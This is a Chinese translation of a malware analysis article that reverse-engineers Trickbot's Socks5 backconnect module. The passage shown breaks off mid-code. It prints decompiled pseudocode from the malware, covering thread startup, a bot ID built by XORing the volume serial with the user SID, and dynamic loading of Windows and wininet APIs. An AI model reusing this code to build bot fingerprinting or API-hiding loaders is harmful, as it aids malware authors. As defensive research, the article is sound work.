# 【技术分享】深入分析Trickbot银行木马的Socks5回连模块
|
##### 译文声明
本文是翻译文章，文章来源：vkremez.com
原文地址：
译文仅供参考，具体内容表达以及含义原文为准。
****
译者：[兴趣使然的小胃](http://bobao.360.cn/member/contribute?uid=2819002922)
预估稿费：110RMB
投稿方式：发送邮件至linwei#360.cn，或登陆网页版在线投稿
**一、前言**
本文的目标是逆向分析Trickbot银行木马所使用的Socks5回连模块，包括对该模块通信协议及源代码的分析。
我们分析的样本为解码后的Trickbot
Socks5回连模块（请参考[此处链接](https://www.virustotal.com/#/file/33ad13c11e87405e277f002e3c4d26d120fcad0ce03b7f1d4831ec0ee0c056c6/detection)查看VirusTotal上的分析结果）。
**  
**
**二、相关背景**
Trickbot银行木马中包含名为“bcClientDllTest”的一个Socks5回连模块，该模块也是Trickbot最引人注目的功能模块。犯罪组织经常利用这个模块发起针对在线账户的欺诈攻击。在伪造PayPal的电子邮件攻击活动中，我们能看到Trickbot感染链路的身影，在分析这条感染链路的过程中，研究人员成功提取了这个功能模块（在此感谢[@Ring0x0](https://twitter.com/Ring0x0)的研究成果）。
11月15日，Reggie在推特上公布了与该模块有关的研究结果，原文如下所示：
经过解码后，可以发现Trickbot Socks5 DLL模块包含如下导出函数：
在本文中，我们主要分析的是其中的“Start”导出函数（序号值为4）。
接下来我们从9个角度对该模块进行分析。
**  
**
**三、技术分析**
**1、配置模板**
首先，该模块中的“Start”导出函数会加载一个默认配置模板，默认模板如下所示：
    yes
**2、CreateThread函数**
接下来，该模块通过strstr
API函数查找”.“在字符串中的位置，将配置模板复制到dword_10034904内存地址中，以`(LPTHREAD_START_ROUTINE)StartAddress`为参数，调用CreateThread
API创建一个新线程。对应的伪代码如下所示：
    void *__stdcall Start(int a1, int a2, int a3, int a4, char *a5, int a6, int a7, int a8)
    {
      unsigned int v8;
      unsigned int v9; 
      char v10;
      void *result;
      v8 = 0;
      v9 = strlen(aModuleconfigAu);
      if ( v9 )
      {
        do
        {
          v10 = aModuleconfigAu[v8++];
          byte_100349A4 = v10;
        }
        while ( v8 < v9 );
      }
      result = 0;
      if ( !dword_10034900 )
      {
        memset(byte_10034908, 0, 0x20u);
        byte_10034908[32] = 0;
        qmemcpy(byte_10034908, strstr(a5, ".") + 1, 0x20u);
        dword_10034900 = 1;
        CreateThread(0, 0, (LPTHREAD_START_ROUTINE)StartAddress, 0, 0, 0);
        result = malloc(0x400u);
        dword_10034904 = (int)result;
      }
      return result;
    }
**3、Bot ID生成函数**
该模块中第一个需要注意的功能是Bot
ID（僵尸节点ID，即“client_id”）生成功能。模块通过GetUserNameA以及LookupAccountNameA函数获取账户SID（security
identifier，安全标识符），然后通过GetVolumeInformationA
API获取磁盘中C分区的序列号，将该序列号与SID进行异或（XOR）处理，生成Bot ID。
对应的C++函数如下所示：
    DWORD bot_id_generator()
    {
      CHAR VolumeNameBuffer; 
      CHAR FileSystemNameBuffer; 
      DWORD FileSystemFlags;
      enum _SID_NAME_USE peUse; 
      DWORD MaximumComponentLength; 
      DWORD cbSid;
      DWORD pcbBuffer;
      DWORD cchReferencedDomainName; 
      LPSTR ReferencedDomainName;
      DWORD VolumeSerialNumber; 
      LPSTR lpBuffer; 
      PSID Sid;
      int i; 
    GetVolumeInformationA(
        "C:\",
        &VolumeNameBuffer,
        0x80u,
        &VolumeSerialNumber,
        &MaximumComponentLength,
        &FileSystemFlags,
        &FileSystemNameBuffer,
        0x80u);
      lpBuffer = (LPSTR)malloc(0x1000u);
      pcbBuffer = 4096;
      Sid = malloc(0x1000u);
      cbSid = 4096;
      ReferencedDomainName = (LPSTR)malloc(0x1000u);
      cchReferencedDomainName = 4096;
      GetUserNameA(lpBuffer, &pcbBuffer);
      memset(Sid, 0, 0x1000u);
      LookupAccountNameA(0, lpBuffer, Sid, &cbSid, ReferencedDomainName, &cchReferencedDomainName, &peUse);
      for ( i = 0; i <= 16; ++i )
        VolumeSerialNumber ^= *((_DWORD *)Sid + i);
      free(lpBuffer);
      free(Sid);
      free(ReferencedDomainName);
      return VolumeSerialNumber;
    }
**4、动态API加载函数**
该模块组合调用常见的LoadLibrary/GetModuleHandleA/GetProcAddress函数，动态加载若干Windows
API函数，如下所示：
    v1 = GetModuleHandleA("kernel32.dll");
    v58 = GetProcAddress(v1, "HeapAlloc");
    v2 = GetModuleHandleA("kernel32.dll");
    v57 = GetProcAddress(v2, "HeapFree");
    v3 = GetModuleHandleA("kernel32.dll");
    v236 = GetProcAddress(v3, "GetProcessHeap");
    v4 = GetModuleHandleA("ntdll.dll");
    v56 = GetProcAddress(v4, "sprintf");
    v5 = GetModuleHandleA("ntdll.dll");
    v29 = GetProcAddress(v5, "strcat");
    v6 = GetModuleHandleA("wininet.dll");
    v39 = GetProcAddress(v6, "InternetOpenA");
    v7 = GetModuleHandleA("wininet.dll");
    v43 = GetProcAddress(v7, "InternetOpenUrlA");
    v8 = GetModuleHandleA("wininet.dll");